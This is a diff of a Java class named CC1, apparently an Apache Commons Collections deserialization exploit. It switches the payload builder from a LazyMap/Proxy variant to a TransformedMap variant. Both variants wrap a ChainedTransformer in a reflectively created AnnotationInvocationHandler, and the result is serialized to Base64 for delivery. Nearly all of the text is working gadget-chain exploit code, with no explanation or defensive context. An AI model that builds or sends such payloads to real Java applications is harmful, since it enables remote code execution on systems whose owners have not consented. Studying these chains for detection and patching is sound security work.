@@ -5,6 +5,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
 
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
@@ -28,24 +29,24 @@ public class CC1 {
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 
 /// ==========================================TransformedMap版==========================================
-//        HashMap<Object,Object> map = new HashMap<>();
-//        map.put("value","value");
-//        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
-//        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-//        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
-//        annotationInvocationHandlerConstructor.setAccessible(true);
-//        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
+        HashMap<Object,Object> map = new HashMap<>();
+        map.put("value","value");
+        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
+        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
 /// ==========================================TransformedMap版==========================================
 
 /// =============================================LazyMap版=============================================
-        HashMap<Object,Object> map = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
-        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
-        annotationInvocationHandlerConstructor.setAccessible(true);
-        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class,lazyMap);
-        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
-        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,mapProxy);
+//        HashMap<Object,Object> map = new HashMap<>();
+//        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+//        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+//        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
+//        annotationInvocationHandlerConstructor.setAccessible(true);
+//        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class,lazyMap);
+//        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
+//        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,mapProxy);
 /// =============================================LazyMap版=============================================
 
         serializeBase64Encode(annotationInvocationHandler);
